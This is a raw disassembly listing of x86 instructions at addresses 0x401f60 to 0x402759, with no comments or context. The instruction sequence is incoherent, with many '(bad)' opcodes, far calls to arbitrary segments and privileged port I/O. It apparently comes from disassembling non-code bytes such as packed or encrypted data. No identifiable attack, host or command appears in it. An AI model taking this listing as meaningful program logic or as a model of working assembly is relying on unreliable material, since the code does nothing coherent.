  401f60:	mov    dl,0x3c
  401f62:	int    0x1
  401f64:	fstp   st(6)
  401f66:	pop    ecx
  401f67:	(bad)  
  401f68:	icebp  
  401f69:	or     edi,DWORD PTR [eax+0x1a]
  401f6c:	inc    esi
  401f6d:	or     al,dh
  401f6f:	lahf   
  401f70:	ja     0x401fd3
  401f72:	call   0xc9fe:0x8b17f9c9
  401f79:	rol    DWORD PTR [eax-0x1ca1d959],1
  401f7f:	jno    0x401f11
  401f81:	and    eax,0xe0523595
  401f86:	mov    esp,0x9a1550e3
  401f8b:	imul   ebp,DWORD PTR [ecx+0x33],0xffffffdb
  401f8f:	sub    ah,BYTE PTR [ecx+0x7c]
  401f92:	out    0xa7,eax
  401f94:	xor    eax,0x86446912
  401f99:	xor    edi,edi
  401f9b:	hlt    
  401f9c:	mov    dl,0xbc
  401f9e:	mov    eax,0x51e4bb34
  401fa3:	cmp    eax,ebp
  401fa5:	loope  0x401f3b
  401fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa8:	clc    
  401fa9:	or     al,0x34
  401fab:	mov    eax,0x6e3f178a
  401fb0:	mov    ch,0xa2
  401fb2:	in     eax,dx
  401fb3:	add    DWORD PTR [ecx+0x50],0x45a9f41a
  401fba:	adc    ah,BYTE PTR [edi-0x29015243]
  401fc0:	mov    ds:0xb2193b73,al
  401fc5:	retf   
  401fc6:	add    DWORD PTR [ecx+0x46],ecx
  401fc9:	mov    ah,0xdf
  401fcb:	leave  
  401fcc:	mov    bh,0x8
  401fce:	adc    BYTE PTR gs:[ebp+0x42f5186f],ch
  401fd5:	add    cl,BYTE PTR [edx]
  401fd7:	lss    eax,FWORD PTR [esi+0x7f]
  401fdb:	add    al,0x47
  401fdd:	adc    ch,BYTE PTR cs:[ecx-0x1956e913]
  401fe4:	mov    bl,0x8b
  401fe6:	sub    eax,0xc0569d97
  401feb:	jmp    0xb49c22a2
  401ff0:	cmc    
  401ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff2:	imul   edx,DWORD PTR [edi+esi*2],0xb
  401ff6:	call   0xbcbe03a5
  401ffb:	pop    ds
  401ffc:	cmp    eax,0x2b6b8954
  402001:	lds    ebx,FWORD PTR [edx-0x231027c9]
  402007:	sbb    eax,esi
  402009:	or     eax,edi
  40200b:	dec    ebx
  40200c:	cmp    BYTE PTR [esi-0x6f],bh
  40200f:	sti    
  402010:	daa    
  402011:	js     0x401fad
  402013:	dec    esp
  402014:	(bad)  
  402015:	or     BYTE PTR [ecx-0x6f],bh
  402018:	pushf  
  402019:	xchg   ebp,eax
  40201a:	test   DWORD PTR [edi-0x109cb1e0],esp
  402020:	inc    ebx
  402021:	mov    edi,ebp
  402023:	ret    0x54bd
  402026:	mul    DWORD PTR [ecx+0x76dad6da]
  40202c:	xchg   ebp,eax
  40202d:	push   0xffffffd6
  40202f:	rol    DWORD PTR [ecx+0xfa7d57a],0x43
  402036:	hlt    
  402037:	xor    BYTE PTR [ebx-0x68],0x37
  40203b:	jmp    0x70b14922
  402040:	mov    dl,0x9
  402042:	push   esi
  402043:	mov    edx,0xc8495a17
  402048:	push   edx
  402049:	or     edi,DWORD PTR [esi+0x50d3810]
  40204f:	icebp  
  402050:	mov    bh,0x8d
  402052:	call   0xc20b:0x8b198472
  402059:	adc    ch,BYTE PTR [edi]
  40205b:	pop    ebp
  40205c:	dec    edi
  40205d:	or     ecx,DWORD PTR [esi]
  40205f:	sbb    BYTE PTR [eax-0x2b48a9a5],ch
  402065:	push   ebx
  402066:	mov    al,ds:0x538cb331
  40206b:	mov    BYTE PTR [eax+0xd3ceaf3],0xf5
  402072:	mov    esp,DWORD PTR [edx+eax*8-0x78a5ceea]
  402079:	enter  0x4f1a,0x6
  40207d:	jmp    0x53a0711c
  402082:	retf   
  402083:	or     dh,dl
  402085:	in     al,dx
  402086:	xor    al,0x97
  402088:	out    dx,eax
  402089:	xchg   BYTE PTR [ecx+esi*8],ah
  40208c:	sub    bl,BYTE PTR ds:[edx+0x3028391e]
  402093:	jp     0x402037
  402095:	mov    ah,0x67
  402097:	sar    bh,1
  402099:	or     BYTE PTR [esi+0x1],ah
  40209c:	out    dx,eax
  40209d:	lahf   
  40209e:	mov    edx,0xdec57a7c
  4020a3:	jae    0x402057
  4020a5:	out    0xcf,eax
  4020a7:	aaa    
  4020a8:	call   0xf72:0x581fafc9
  4020af:	test   al,0x8b
  4020b1:	shr    BYTE PTR [edx-0x7dc50d7c],0xb3
  4020b8:	aam    0x21
  4020ba:	call   0x4d22:0x8a57c31a
  4020c1:	clc    
  4020c2:	into   
  4020c3:	aam    0x1b
  4020c5:	or     esp,DWORD PTR [esi+0x72]
  4020c8:	mov    dh,0x28
  4020ca:	rcr    BYTE PTR [ecx+0x75],cl
  4020cd:	into   
  4020ce:	sub    dl,BYTE PTR [ecx-0x4e]
  4020d1:	cmp    bl,BYTE PTR [eax+0x5e]
  4020d4:	test   eax,0x78d15afb
  4020d9:	or     ebp,DWORD PTR [edx]
  4020db:	mov    gs,ecx
  4020dd:	(bad)  
  4020de:	or     eax,0x9af82c8c
  4020e3:	call   0x65040973
  4020e8:	retf   
  4020e9:	adc    ebx,DWORD PTR [eax]
  4020eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020ec:	fldcw  WORD PTR [ebx]
  4020ee:	fcom   DWORD PTR [ecx+0x4db0f693]
  4020f4:	mov    BYTE PTR ds:0x53f2010,cl
  4020fa:	and    BYTE PTR [ebx-0x3e],al
  4020fd:	test   BYTE PTR [ecx],ah
  4020ff:	es stc 
  402101:	or     ebx,DWORD PTR [ecx+eax*2]
  402104:	(bad)  
  402105:	ss xchg esi,eax
  402107:	add    dh,ah
  402109:	dec    edx
  40210a:	loope  0x402154
  40210c:	xchg   esi,eax
  40210d:	loope  0x40212c
  40210f:	cmp    al,0xb2
  402111:	data16 jge 0x4020c7
  402114:	lahf   
  402115:	aam    0xca
  402117:	mov    al,ds:0xd542d830
  40211c:	jle    0x4020c9
  40211e:	int3   
  40211f:	mov    BYTE PTR [esi],dl
  402121:	(bad)  
  402122:	call   0x69ff:0x126274b1
  402129:	jmp    0xa225c850
  40212e:	or     al,0x83
  402130:	scas   al,BYTE PTR es:[edi]
  402131:	into   
  402132:	out    0xad,eax
  402134:	mov    dl,0x6a
  402136:	mov    esp,0x544df0e4
  40213b:	rol    BYTE PTR [ecx],1
  40213d:	or     ebx,DWORD PTR [ebp+0x569bb31f]
  402143:	cmovp  esi,DWORD PTR [edi]
  402146:	call   0x5d22:0x93abbfa5
  40214d:	adc    ecx,DWORD PTR [edi+eiz*4+0x49722a09]
  402154:	inc    esp
  402155:	push   ebp
  402156:	out    0x3c,al
  402158:	mov    dl,0xec
  40215a:	cmp    al,0xb6
  40215c:	neg    dl
  40215e:	cdq    
  40215f:	cwde   
  402160:	lods   al,BYTE PTR ds:[esi]
  402161:	or     esp,DWORD PTR [ecx-0x6]
  402164:	mov    ah,0x9f
  402166:	sub    ah,cl
  402168:	stos   BYTE PTR es:[edi],al
  402169:	in     al,0x9a
  40216b:	sub    BYTE PTR [esi],bh
  40216d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40216e:	sub    eax,0xd6f6637e
  402173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402174:	call   0xd84cce0a
  402179:	push   edi
  40217a:	dec    edx
  40217b:	jge    0x40212f
  40217d:	pop    esi
  40217e:	and    esp,DWORD PTR [ecx+0x29]
  402181:	lds    edx,FWORD PTR [eax]
  402183:	icebp  
  402184:	mov    esi,0x3324f50a
  402189:	shl    BYTE PTR [esi+0x364bf52b],cl
  40218f:	pushf  
  402190:	and    edi,ecx
  402192:	call   0xa096:0x3f680f93
  402199:	out    dx,al
  40219a:	jp     0x402143
  40219c:	jl     0x402144
  40219e:	dec    ebx
  40219f:	and    BYTE PTR [edx],ch
  4021a1:	xchg   edi,eax
  4021a2:	cmp    DWORD PTR ds:0x1fa6e054,edi
  4021a8:	stos   BYTE PTR es:[edi],al
  4021a9:	mov    ebp,DWORD PTR ds:0x37e2b60e
  4021af:	popa   
  4021b0:	imul   ecx,DWORD PTR [eax+ebx*4],0xffffff91
  4021b4:	xor    BYTE PTR [ebx-0x47c8d889],bh
  4021ba:	not    ebx
  4021bc:	mov    ebp,0x7a9bcf68
  4021c1:	push   0x5
  4021c3:	fcom   QWORD PTR [edi-0x6ef8ae86]
  4021c9:	retf   0xa72d
  4021cc:	cmp    bh,BYTE PTR [edi-0x5d]
  4021cf:	mov    cl,0x23
  4021d1:	xor    eax,DWORD PTR [ecx+0x3b]
  4021d4:	mov    dl,0xf
  4021d6:	push   ecx
  4021d7:	pop    edi
  4021d8:	fdiv   DWORD PTR [ebx-0x1]
  4021db:	and    BYTE PTR [ecx],0xb
  4021de:	test   DWORD PTR [esi],edx
  4021e0:	iret   
  4021e1:	das    
  4021e2:	xchg   edx,eax
  4021e3:	adc    ch,cl
  4021e5:	stc    
  4021e6:	call   0xeef8:0xa8581f47
  4021ed:	stos   DWORD PTR es:[edi],eax
  4021ee:	mov    bl,0xa7
  4021f0:	sub    DWORD PTR [esi-0x1341a93f],esi
  4021f6:	jae    0x402247
  4021f8:	jae    0x402259
  4021fa:	dec    ebp
  4021fb:	repz jp 0x402225
  4021fe:	jb     0x402274
  402200:	adc    eax,0x24a7457a
  402205:	add    DWORD PTR [ebp-0xd1de1d3],edx
  40220b:	sahf   
  40220c:	mov    bl,0x34
  40220e:	fidiv  DWORD PTR ds:0x7c2c7d03
  402214:	dec    esi
  402215:	or     esp,DWORD PTR ds:[edi+0x22226415]
  40221c:	mov    ah,0xe3
  40221e:	imul   edi
  402220:	mov    dl,0x7a
  402222:	sar    ebp,cl
  402224:	loop   0x4021b6
  402226:	mov    esp,0x87171bb4
  40222b:	and    DWORD PTR [edi-0x75],ebx
  40222e:	lds    edi,FWORD PTR [eax-0x73]
  402231:	lds    ebx,FWORD PTR [edi]
  402233:	mov    ds:0x972714b2,al
  402238:	sub    eax,edi
  40223a:	addr16 enter 0x5f7,0x9
  40223f:	loopne 0x40223d
  402241:	std    
  402242:	mov    edx,0x4401ac82
  402247:	push   edx
  402248:	mov    bl,0x19
  40224a:	data16 sub ch,BYTE PTR [ebx]
  40224d:	jecxz  0x402264
  40224f:	repz pop edx
  402251:	dec    ebp
  402252:	xchg   ecx,eax
  402253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402254:	outs   dx,BYTE PTR ds:[esi]
  402255:	test   DWORD PTR [esi-0x9],ebp
  402258:	inc    esp
  402259:	push   cs
  40225a:	dec    edi
  40225b:	pop    esi
  40225c:	mov    dl,0xd2
  40225e:	dec    eax
  40225f:	xchg   esp,eax
  402260:	push   esi
  402261:	cmp    eax,0xcd0bcb7
  402266:	out    dx,eax
  402267:	push   ss
  402268:	mov    al,0xce
  40226a:	pop    esp
  40226b:	pushf  
  40226c:	mov    bl,0xf3
  40226e:	jbe    0x402233
  402270:	cdq    
  402271:	fstp   TBYTE PTR [eax-0x22474c26]
  402277:	jmp    0xc82:0x3cf3288c
  40227e:	les    esp,FWORD PTR [edi+0x6a86fe55]
  402284:	sbb    al,0x10
  402286:	pop    edi
  402287:	push   ebx
  402288:	mov    ch,0x94
  40228a:	dec    esi
  40228b:	loop   0x402290
  40228d:	int    0xfb
  40228f:	ins    DWORD PTR es:[edi],dx
  402290:	pop    ebp
  402291:	sti    
  402292:	stos   BYTE PTR es:[edi],al
  402293:	daa    
  402294:	in     eax,0xb
  402296:	out    dx,al
  402297:	mov    edi,0x81898283
  40229c:	mov    esi,0xc0b97c32
  4022a1:	push   ds
  4022a2:	xchg   esp,eax
  4022a3:	inc    ecx
  4022a4:	push   ds
  4022a5:	int    0xba
  4022a7:	daa    
  4022a8:	push   ecx
  4022a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022aa:	xchg   esp,eax
  4022ab:	and    DWORD PTR [edx-0xb24e5f5],ebx
  4022b1:	push   esi
  4022b2:	lahf   
  4022b3:	mov    al,0x87
  4022b5:	js     0x40231b
  4022b7:	jge    0x402275
  4022b9:	mov    esp,0xc9e0a31
  4022be:	sub    BYTE PTR [eax+0x12],0x19
  4022c2:	push   ecx
  4022c3:	add    eax,0x77190ad4
  4022c8:	mov    esp,0xefff1dca
  4022cd:	test   BYTE PTR [eax],al
  4022cf:	dec    edx
  4022d0:	dec    edx
  4022d1:	int3   
  4022d2:	lods   al,BYTE PTR ds:[esi]
  4022d3:	test   al,0x42
  4022d5:	push   ss
  4022d6:	cmovns esp,DWORD PTR [edx+ecx*1-0x418a02bf]
  4022de:	sbb    BYTE PTR [esi+0x19],al
  4022e1:	xlat   BYTE PTR ds:[ebx]
  4022e2:	add    dh,BYTE PTR [eax]
  4022e4:	mov    dl,0x58
  4022e6:	ds pop ebp
  4022e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022e9:	add    DWORD PTR [ecx-0x65],esp
  4022ec:	int    0xb
  4022ee:	xchg   ebx,eax
  4022ef:	fnstcw WORD PTR [eax]
  4022f1:	jl     0x402361
  4022f3:	xor    eax,0x779a61ae
  4022f8:	sbb    dh,BYTE PTR [edx]
  4022fa:	out    0x6e,eax
  4022fc:	cld    
  4022fd:	loopne 0x402348
  4022ff:	cwde   
  402300:	fs (bad) 
  402302:	call   0x9cb:0x12903b9d
  402309:	fs call 0x6981:0xa518f9ab
  402311:	gs in  eax,dx
  402313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402314:	das    
  402315:	das    
  402316:	and    BYTE PTR [edi+0xa],0xd1
  40231a:	mov    al,0xb7
  40231c:	mov    esp,0x4f8068fd
  402321:	or     al,0x1d
  402323:	xchg   BYTE PTR [ecx],al
  402325:	fst    QWORD PTR [ebx-0x131f3fd1]
  40232b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40232c:	shl    edi,1
  40232e:	gs xchg ebx,eax
  402330:	shl    BYTE PTR [edx],cl
  402332:	sbb    BYTE PTR [esi],al
  402334:	mov    dl,0x7f
  402336:	mov    esi,0x2e61aa5e
  40233b:	xor    al,0x92
  40233d:	sti    
  40233e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40233f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402340:	inc    esi
  402341:	add    cl,BYTE PTR [ebx]
  402343:	adc    eax,0x926771e
  402348:	test   esi,ebp
  40234a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40234b:	jns    0x40233f
  40234d:	jp     0x4022dd
  40234f:	aam    0x2f
  402351:	or     ebp,ebp
  402353:	mov    al,ds:0xf1f29a46
  402358:	fimul  WORD PTR [eax-0x62e18466]
  40235e:	iret   
  40235f:	xchg   esp,ecx
  402361:	add    eax,0x482a767
  402366:	xor    BYTE PTR [ebx+0x1a],0x89
  40236a:	xor    BYTE PTR cs:[ebx+0x3e372ab0],0xa8
  402372:	into   
  402373:	rcl    dl,1
  402375:	pushw  cs
  402377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402378:	(bad)  
  402379:	repnz stc 
  40237b:	and    DWORD PTR [edx+0x69],ecx
  40237e:	gs xchg ecx,eax
  402380:	mov    dl,0x66
  402382:	jmp    0x4023a0
  402384:	mov    dh,0x23
  402386:	lea    eax,[ebp+0x2a820bf1]
  40238c:	out    0xc0,eax
  40238e:	cmc    
  40238f:	clc    
  402390:	push   ecx
  402391:	scas   al,BYTE PTR es:[edi]
  402392:	call   0xa64:0xee584434
  402399:	outs   dx,BYTE PTR ds:[esi]
  40239a:	je     0x402354
  40239c:	pop    ebp
  40239d:	xchg   edi,ecx
  40239f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023a0:	inc    edi
  4023a1:	sbb    al,0x4
  4023a3:	scas   al,BYTE PTR es:[edi]
  4023a4:	jb     0x4023d3
  4023a6:	xor    esp,esi
  4023a8:	mov    dl,0x9f
  4023aa:	(bad)  
  4023ab:	out    dx,al
  4023ac:	loopne 0x40242b
  4023ae:	mov    gs,edi
  4023b0:	jmp    0x2c32f4c0
  4023b5:	jl     0x402401
  4023b7:	lods   al,BYTE PTR ds:[esi]
  4023b8:	shl    DWORD PTR [ebx+0x60d09299],cl
  4023be:	stc    
  4023bf:	and    DWORD PTR [edi-0x5],0x3d
  4023c3:	arpl   bp,bx
  4023c5:	or     edi,DWORD PTR [ebx+ebp*2-0x2a]
  4023c9:	pop    esi
  4023ca:	xchg   edi,eax
  4023cb:	mov    ch,0xcf
  4023cd:	stos   BYTE PTR es:[edi],al
  4023ce:	mov    al,ds:0xad8c1001
  4023d3:	dec    edi
  4023d4:	lahf   
  4023d5:	push   cs
  4023d6:	cli    
  4023d7:	aas    
  4023d8:	inc    edx
  4023da:	imul   BYTE PTR [eax-0x56ae7c1e]
  4023e0:	jb     0x402456
  4023e2:	pmulhuw mm1,QWORD PTR ss:[ecx]
  4023e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023e7:	mov    cl,BYTE PTR [edi+0x4b47cd0b]
  4023ed:	mov    al,ds:0xbd7c4a5
  4023f2:	aas    
  4023f3:	or     eax,0xc390fb45
  4023f8:	add    ebx,DWORD PTR [edx+ebx*4]
  4023fb:	test   eax,0x5a9863ac
  402400:	jae    0x402422
  402402:	pop    eax
  402403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402404:	or     eax,DWORD PTR [esi-0x6fdf2ac8]
  40240a:	dec    ecx
  40240b:	cmc    
  40240c:	mov    dl,0xce
  40240e:	mov    eax,eax
  402410:	shr    edi,0xeb
  402413:	jg     0x40245b
  402415:	or     edx,ecx
  402417:	pop    edi
  402418:	xor    bh,BYTE PTR [eax]
  40241a:	mov    al,0x6d
  40241c:	jnp    0x402454
  40241e:	ret    0x2107
  402421:	or     edx,eax
  402423:	jo     0x402417
  402425:	scas   al,BYTE PTR es:[edi]
  402426:	pop    ecx
  402427:	jl     0x4023de
  402429:	or     esp,DWORD PTR [esi+0x2016df13]
  40242f:	addr16 jbe 0x4023b6
  402432:	call   0xd15a:0xc2e33192
  402439:	out    dx,al
  40243a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40243c:	add    esi,edx
  40243e:	in     al,dx
  40243f:	push   edi
  402440:	sbb    bl,BYTE PTR [ebx]
  402442:	mov    bl,0x9a
  402444:	mov    dl,0xbe
  402446:	pop    ss
  402447:	inc    ebx
  402448:	mov    al,gs:0x25acb53a
  40244e:	lock xchg bh,al
  402451:	or     ebx,edi
  402453:	cli    
  402454:	leave  
  402455:	scas   eax,DWORD PTR es:[edi]
  402456:	cmp    eax,0xe28bb2e9
  40245b:	dec    ecx
  40245c:	or     dh,ch
  40245e:	and    ch,BYTE PTR es:[edi+0xb]
  402462:	repz inc ebx
  402464:	sub    DWORD PTR [edx],edi
  402466:	lock mov DWORD PTR ds:0xb239eff3,eax
  40246d:	push   esi
  40246e:	dec    ecx
  40246f:	jnp    0x4024e7
  402471:	je     0x4024b1
  402473:	push   esp
  402474:	pop    ds
  402475:	in     eax,dx
  402476:	mov    fs,WORD PTR [edi-0x2b62afc5]
  40247c:	xor    ebp,DWORD PTR [ecx+0x6ab2b6d8]
  402482:	scas   al,BYTE PTR es:[edi]
  402483:	xor    DWORD PTR [ecx+0x48],esi
  402486:	cli    
  402487:	pop    ebx
  402488:	fist   WORD PTR [edi]
  40248a:	bound  esp,QWORD PTR [eax+ebp*4+0x331fc789]
  402491:	rcr    DWORD PTR [edx-0x9],1
  402494:	aas    
  402495:	dec    edi
  402496:	call   0x7f60:0xd4ca872c
  40249d:	jle    0x4024bd
  40249f:	lods   al,BYTE PTR ds:[esi]
  4024a0:	mov    es,WORD PTR [ebx+ecx*4]
  4024a3:	xor    eax,0x8dbaf532
  4024a8:	dec    edi
  4024a9:	pop    ds
  4024aa:	xchg   dl,cl
  4024ac:	lahf   
  4024ad:	inc    eax
  4024ae:	sbb    bl,dh
  4024b0:	pop    esp
  4024b1:	push   edi
  4024b2:	outs   dx,BYTE PTR ds:[esi]
  4024b3:	mov    ebx,0x18a50bf5
  4024b8:	mov    bh,0x87
  4024ba:	addr16 dec esp
  4024bc:	sbb    BYTE PTR [ebx],dh
  4024be:	xchg   esp,eax
  4024bf:	mov    bh,0xea
  4024c1:	add    eax,0x16d04405
  4024c6:	ja     0x402449
  4024c8:	mov    al,ds:0xf7a7733d
  4024cd:	mov    dl,0xea
  4024cf:	cmp    eax,0x689acf90
  4024d4:	call   FWORD PTR gs:[edi-0x7de14003]
  4024db:	call   FWORD PTR [edi]
  4024dd:	mov    bl,0x9a
  4024df:	sar    BYTE PTR [ecx+0x5a],0xce
  4024e3:	popa   
  4024e4:	jl     0x402476
  4024e6:	call   0xf6a3:0xea12d1ab
  4024ed:	jge    0x402483
  4024ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024f0:	scas   eax,DWORD PTR es:[edi]
  4024f1:	xor    BYTE PTR [esi+0x8],0x89
  4024f5:	test   BYTE PTR ds:0x65bbb213,0x7b
  4024fc:	(bad)  
  4024fd:	sar    DWORD PTR [ebx+0x49],cl
  402500:	xlat   BYTE PTR ds:[ebx]
  402501:	rsqrtps xmm2,xmm6
  402504:	sub    al,0xa2
  402506:	js     0x402528
  402508:	mov    ds,WORD PTR [ebx]
  40250a:	lods   al,BYTE PTR ds:[esi]
  40250b:	out    dx,al
  40250c:	iret   
  40250d:	fcomp  DWORD PTR [ebp-0x74635549]
  402513:	sbb    DWORD PTR [edx+0x497d08d3],esi
  402519:	adc    eax,0x4bf9a654
  40251e:	xor    esp,edi
  402520:	repz in eax,0x6
  402523:	hlt    
  402524:	mov    dl,0x45
  402526:	or     dl,dh
  402528:	xor    bl,BYTE PTR [esi-0x6f]
  40252b:	inc    esp
  40252c:	sbb    eax,0x5ad49704
  402531:	push   eax
  402532:	fidivr DWORD PTR [edx-0x5723fae6]
  402538:	mov    dl,0x7d
  40253a:	push   edx
  40253b:	js     0x4025b1
  40253d:	in     eax,dx
  40253e:	pushf  
  40253f:	lods   al,BYTE PTR ds:[esi]
  402540:	(bad)  
  402541:	or     edi,DWORD PTR [edi]
  402543:	and    al,0xfb
  402545:	mov    ds:0x8dc8dc49,al
  40254a:	call   0xdea9:0xca3371b5
  402551:	xchg   ebx,eax
  402552:	shl    BYTE PTR [edi+0x696bb469],cl
  402558:	push   esp
  402559:	(bad)  
  40255a:	(bad)  
  40255b:	push   ebx
  40255c:	xchg   DWORD PTR [ebx],eax
  40255e:	sbb    BYTE PTR ds:0xa442f532,0x1f
  402565:	or     al,0xf1
  402567:	idiv   bl
  402569:	push   ebx
  40256a:	shr    BYTE PTR [eax-0x46cb322e],0xa1
  402571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402572:	call   0x8204:0x91111a54
  402579:	jnp    0x40258d
  40257b:	test   al,0xdc
  40257d:	sbb    eax,0x4d12292d
  402582:	inc    eax
  402583:	adc    DWORD PTR [edi],ecx
  402585:	fistp  WORD PTR [edx+0x7e67639]
  40258b:	cmp    ecx,DWORD PTR [edx+ebx*8]
  40258e:	or     ah,BYTE PTR [edi-0x3758f85a]
  402594:	xor    BYTE PTR [ecx+ebx*4],0x2e
  402598:	mov    dl,0xd7
  40259a:	cwde   
  40259b:	cld    
  40259c:	out    dx,al
  40259d:	sbb    al,0x79
  40259f:	or     DWORD PTR [ebp+0xb],0xffffffed
  4025a3:	icebp  
  4025a4:	pop    ss
  4025a5:	test   eax,0xcd85701
  4025aa:	jmp    0xcabdd7ba
  4025af:	jnp    0x40254d
  4025b1:	int3   
  4025b2:	sub    eax,ecx
  4025b4:	fimul  DWORD PTR [ebx]
  4025b6:	in     eax,dx
  4025b7:	jmp    0xa4b1:0x3594aab4
  4025be:	xchg   BYTE PTR [ebp-0x27251621],cl
  4025c4:	shl    BYTE PTR [ebp-0x28],cl
  4025c7:	clc    
  4025c8:	and    ecx,DWORD PTR [ebx]
  4025ca:	dec    ecx
  4025cb:	inc    esi
  4025cc:	adc    al,0xb2
  4025ce:	cld    
  4025cf:	test   BYTE PTR [eax+ebp*2-0x66],ch
  4025d3:	int3   
  4025d4:	scas   eax,DWORD PTR es:[edi]
  4025d5:	adc    ebx,DWORD PTR [ecx]
  4025d7:	pop    ecx
  4025d8:	jecxz  0x4025f3
  4025da:	push   cs
  4025db:	test   al,0x90
  4025dd:	sbb    BYTE PTR [ecx],cl
  4025df:	out    0xf2,eax
  4025e1:	mov    bl,0xaa
  4025e3:	mov    eax,ds:0xd894cdd6
  4025e8:	ss jge 0x4025c7
  4025eb:	inc    ebp
  4025ec:	jmp    0x4025a4
  4025ee:	mov    eax,ds:0xe01568e7
  4025f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025f4:	jg     0x402656
  4025f6:	ds jmp 0x53f2f6c9
  4025fc:	dec    ecx
  4025fd:	outs   dx,DWORD PTR ds:[esi]
  4025fe:	call   0x1db1:0xef013d38
  402605:	repnz xchg ebx,eax
  402607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402608:	and    ch,bl
  40260a:	jo     0x402667
  40260c:	jae    0x402621
  40260e:	retf   0x8cc6
  402611:	xchg   ebx,eax
  402612:	repz and BYTE PTR [esp+edi*1+0x41],cl
  402617:	jmp    0x5552c53e
  40261c:	jg     0x402629
  40261e:	in     al,0xf5
  402620:	mov    al,ds:0xb082dde1
  402625:	je     0x4025c1
  402627:	inc    ebx
  402628:	jmp    0xd6ea:0x3f20197f
  40262f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402630:	mov    ah,0xc
  402632:	dec    ecx
  402633:	jmp    0x4e3b:0x63dc5ebc
  40263a:	call   0x3004:0x38374b12
  402641:	mov    ecx,0x325a76b
  402646:	jmp    0xb273:0x70e2125b
  40264d:	(bad)  [edx-0x61]
  402650:	pushf  
  402651:	jno    0x402654
  402653:	leave  
  402654:	mov    ecx,DWORD PTR [edx]
  402656:	aam    0x3b
  402658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402659:	adc    al,0x7
  40265b:	push   ecx
  40265c:	cmc    
  40265d:	fisubr WORD PTR [eax-0x6591ea9d]
  402663:	or     eax,0x7ca11eb4
  402668:	jo     0x40260d
  40266a:	sbb    al,0x97
  40266c:	out    0x98,al
  40266e:	pop    eax
  40266f:	lods   eax,DWORD PTR ds:[esi]
  402670:	(bad)  
  402671:	push   edx
  402672:	xchg   esp,eax
  402673:	add    ah,BYTE PTR [esi]
  402675:	inc    eax
  402676:	mov    fs,WORD PTR [edi-0x1c]
  402679:	sbb    eax,0x5b57635f
  40267f:	push   es
  402680:	mov    dl,0xcc
  402682:	cdq    
  402683:	push   es
  402684:	xchg   ebp,eax
  402685:	retf   
  402686:	ffree  st(1)
  402688:	mov    dl,0xb5
  40268a:	inc    ebp
  40268b:	inc    eax
  40268c:	mov    al,ds:0xb06b3841
  402691:	or     ecx,ebp
  402693:	int    0x52
  402695:	fisttp WORD PTR [eax-0x18]
  402698:	xchg   BYTE PTR [edi-0x6b],bh
  40269b:	dec    esi
  40269c:	ins    DWORD PTR es:[edi],dx
  40269d:	inc    eax
  40269e:	xchg   DWORD PTR es:[edx-0x44ef7254],ecx
  4026a5:	or     ebp,DWORD PTR [ecx+0x44]
  4026a8:	inc    esp
  4026a9:	pop    ss
  4026aa:	and    esp,DWORD PTR [esi-0x5089636f]
  4026b0:	mov    dl,0x5e
  4026b2:	push   edx
  4026b3:	addr16 lock jmp 0x6b08:0xb2a7495
  4026bc:	test   eax,0x92009f8f
  4026c1:	das    
  4026c2:	sahf   
  4026c3:	cmp    BYTE PTR [edx+0x72a39944],0xf4
  4026ca:	mov    ds:0xb064b,al
  4026cf:	repz jg 0x402746
  4026d2:	out    0x51,eax
  4026d4:	mov    al,ds:0xb1869a6d
  4026d9:	hlt    
  4026da:	pop    esi
  4026db:	outs   dx,DWORD PTR ds:[esi]
  4026dc:	sub    eax,0x7bbb49b0
  4026e1:	cld    
  4026e2:	pop    edi
  4026e3:	out    0x99,eax
  4026e5:	dec    eax
  4026e6:	fild   WORD PTR [eax]
  4026e8:	sar    BYTE PTR [edx],1
  4026ea:	call   0xfc05:0x3b13ba65
  4026f1:	sub    ah,BYTE PTR fs:[edi+0x6ab1881b]
  4026f8:	leave  
  4026f9:	mov    eax,0x71b24dd3
  4026fe:	add    BYTE PTR [ebx],bl
  402700:	dec    ecx
  402701:	les    esi,FWORD PTR [edx]
  402703:	jo     0x402759
  402705:	or     eax,DWORD PTR [eax-0x5db39270]
  40270b:	jp     0x4026f3
  40270d:	inc    edx
  40270e:	call   0xecaf:0xb2e0e8db
  402715:	pop    eax
  402716:	scas   al,BYTE PTR es:[edi]
  402717:	mov    eax,0xb950021e
  40271c:	sbb    cl,BYTE PTR [ecx+0x468e14]
  402722:	jp     0x4027a2
  402724:	lock pop ebx
  402726:	dec    eax
  402727:	cdq    
  402728:	mov    dl,0x1d
  40272a:	mov    al,ds:0x55c20623
  40272f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402730:	(bad)  
  402731:	mov    cl,0xd3
  402733:	inc    edi
  402734:	and    eax,0x21573a1c
  402739:	ins    DWORD PTR es:[edi],dx
  40273a:	call   0x9274:0x6ba1c236
  402741:	inc    esi
  402742:	mov    eax,ds:0xc3842ea7
  402747:	dec    ebx
  402748:	mov    ecx,0xb28f3d49
  40274d:	mov    ds:0x963126d,al
  402752:	inc    edi
  402753:	pop    ebp
  402754:	loopne 0x402762
  402756:	mov    ebx,DWORD PTR [eax+0x3a]
  402759:	jg     0x4026dc
